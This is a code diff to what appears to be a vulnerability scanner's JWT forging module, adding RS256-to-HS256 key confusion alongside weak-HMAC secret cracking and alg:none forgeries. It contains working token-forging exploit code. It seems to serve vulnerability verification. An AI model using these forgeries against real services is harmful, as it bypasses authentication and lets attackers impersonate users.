@@ -2,9 +2,11 @@
 // Two high-signal forgeries, same evidence loop (garbage control rejected + forged token accepted twice):
 //   1. weak HMAC secret (HS256/384/512) — crack the live token against a small default-secret wordlist, then mint a new one
 //   2. alg:none case variants — signature not verified
-// Not in scope here: jku/x5u (needs a hosted JWKS), kid path/SQLi (no tight oracle), RS256→HS256 key confusion.
+//   3. RS256->HS256 key confusion — re-sign the RS256 token as HS256 using the RSA PUBLIC KEY (PEM) as the HMAC secret
+//      (a naive verifier that reads the alg from the token header accepts it); the public key comes from the JWKS.
+// Not in scope here: jku/x5u (needs a hosted JWKS the target fetches) and kid path/SQLi (no tight in-band oracle).
 
-import { createHmac, timingSafeEqual } from "node:crypto";
+import { createHmac, createPublicKey, timingSafeEqual } from "node:crypto";
 
 export const ALG_NONE_VARIANTS = ["none", "None", "NONE"] as const;
 
@@ -156,6 +158,34 @@ export function forgeJwtHmac(token: string, secret: string, mutate?: (claims: Re
   return `${h}.${p}.${sig}`;
 }
 
+/** RS256->HS256 key confusion: re-sign the same header/payload as HS256 using the RSA PUBLIC KEY (PEM) as the HMAC
+ *  secret. A naive verifier that selects the algorithm from the token header (HS256) verifies the HMAC with what it
+ *  believes is the RSA public key — which the attacker also has — so the forged token is accepted. */
+export function forgeJwtKeyConfusion(token: string, publicKeyPem: string, mutate?: (claims: Record<string, unknown>) => void): string | null {
+  const parsed = parseJwt(token);
+  if (!parsed || !publicKeyPem) return null;
+  const header = { ...parsed.header, alg: "HS256" };
+  const payload = { ...parsed.payload };
+  if (mutate) mutate(payload);
+  const h = b64urlEncode(JSON.stringify(header));
+  const p = b64urlEncode(JSON.stringify(payload));
+  const sig = createHmac("sha256", publicKeyPem).update(`${h}.${p}`).digest("base64url").replace(/=+$/, "");
+  return `${h}.${p}.${sig}`;
+}
+
+/** Derive the first RSA public key from a JWKS document as an SPKI PEM (for RS256->HS256 confusion). */
+export function pemFromJwks(jwksJson: string): string | null {
+  try {
+    const jwks = JSON.parse(jwksJson) as { keys?: Array<Record<string, unknown>> };
+    const key = (Array.isArray(jwks.keys) ? jwks.keys : []).find((k) => k.kty === "RSA" && typeof k.n === "string" && typeof k.e === "string");
+    if (!key) return null;
+    const pub = createPublicKey({ key, format: "jwk" } as unknown as Parameters<typeof createPublicKey>[0]);
+    return pub.export({ type: "spki", format: "pem" }).toString();
+  } catch {
+    return null;
+  }
+}
+
 /** Default payload tweak so a cracked-secret forge is not a replay of the stolen token. Identity claims stay intact. */
 export function bumpJwtExp(claims: Record<string, unknown>): void {
   if (typeof claims.exp === "number" && Number.isFinite(claims.exp)) claims.exp = claims.exp + 60;
@@ -163,12 +193,21 @@ export function bumpJwtExp(claims: Record<string, unknown>): void {
 }
 
 /** Ordered candidates: weak HMAC first (more specific root cause), then alg:none variants. */
-export function jwtForgeCandidates(token: string, mutate?: (claims: Record<string, unknown>) => void): JwtCandidate[] {
+export function jwtForgeCandidates(token: string, mutate?: (claims: Record<string, unknown>) => void, opts: { publicKeyPem?: string } = {}): JwtCandidate[] {
   const out: JwtCandidate[] = [];
   const cracked = crackJwtHmac(token);
   if (cracked) {
     const forged = forgeJwtHmac(token, cracked.secret, mutate);
     if (forged) out.push({ token: forged, technique: `weak-hmac:${cracked.alg}`, secret: cracked.secret });
+  }
+  // RS256->HS256 key confusion when a public key (from the JWKS) is available and the token is asymmetric-signed.
+  if (opts.publicKeyPem) {
+    const parsed = parseJwt(token);
+    const alg = parsed && typeof parsed.header.alg === "string" ? parsed.header.alg.trim().toUpperCase() : "";
+    if (/^(?:RS|PS|ES)(?:256|384|512)$/.test(alg)) {
+      const forged = forgeJwtKeyConfusion(token, opts.publicKeyPem, mutate);
+      if (forged) out.push({ token: forged, technique: `key-confusion:${alg}->HS256` });
+    }
   }
   for (const alg of ALG_NONE_VARIANTS) {
     const forged = forgeAlgNone(token, mutate, alg);
